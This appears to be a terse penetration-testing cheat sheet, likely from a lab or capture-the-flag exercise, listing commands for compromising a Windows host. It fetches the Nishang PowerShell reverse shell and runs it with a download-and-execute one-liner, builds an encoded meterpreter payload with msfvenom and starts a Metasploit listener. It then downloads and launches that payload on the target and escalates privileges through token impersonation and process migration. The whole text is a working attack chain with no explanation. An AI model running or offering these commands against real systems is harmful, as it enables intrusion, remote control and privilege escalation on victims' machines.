# Terminal
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
python3 -m http.server 80 
# CMD
powershell iex (New-Object Net.WebClient).DownloadString('http://10.21.13.163:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.21.13.163 -Port 4443
# Terminal
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.14.84.79 LPORT=4444 -f exe -o shell-name.exe
sudo msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.14.84.79
set LPORT 4444
run -j
# Powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.14.84.79:80/shell-name.exe','shell-name.exe')"
Start-Process "shell-name.exe"
whoami /priv
# SeDebugPrivilege
# SeImpersonatePrivilege
# Meterpreter
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid
getpid
ps
migrate 676

# cmd
cd %temp%
powershell -c "Invoke-WebRequest -Uri 'http://10.14.84.79:80/shell-name.exe' -OutFile 'C:\Windows\Temp\shell-name.exe'"
powershell -c "Start-Process 'shell-name.exe'"